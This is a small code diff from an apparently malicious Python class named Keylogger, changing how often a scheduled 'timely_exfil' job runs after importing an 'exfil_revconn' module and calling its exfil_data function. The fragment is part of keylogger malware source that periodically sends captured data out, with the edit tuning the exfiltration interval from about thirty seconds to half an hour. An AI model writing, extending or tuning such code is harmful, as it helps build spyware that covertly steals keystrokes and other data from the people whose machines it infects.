@@ -30,7 +30,7 @@ class Keylogger:
         import exfil_revconn as exfil
         exfil.exfil_data()
         scheduler = BlockingScheduler()
-        scheduler.add_job(self.timely_exfil, "interval", hours=0.0083)
+        scheduler.add_job(self.timely_exfil, "interval", hours=0.5)
         scheduler.start()
 
     def BreakTime(self):
